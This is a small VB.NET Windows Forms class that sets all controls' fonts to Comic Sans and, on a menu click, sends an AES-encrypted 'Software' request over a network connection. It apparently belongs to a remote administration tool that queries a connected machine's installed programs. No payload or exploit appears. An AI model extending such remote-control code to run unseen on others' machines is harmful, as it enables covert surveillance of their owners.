Public Class FormSoftwareList
    Public connected As Connection
    Private Sub ChangeFont(ByVal container As Control)
        For Each ctrl As Control In container.Controls
            ' Change font for the control
            ctrl.Font = New Font("Comic Sans MS", 9, FontStyle.Regular)

            ' If the control has children, recursively change their fonts
            If ctrl.HasChildren Then
                ChangeFont(ctrl)
            End If
        Next
    End Sub

    Private Sub ToolStripMenuItem2_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem2.Click
        Try
            connected.Send(New Encryption().AES_Encrypt("Software", Form1.enckey))
        Catch
        End Try
    End Sub

    Private Sub FormSoftwareList_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        ChangeFont(Me)

    End Sub
End Class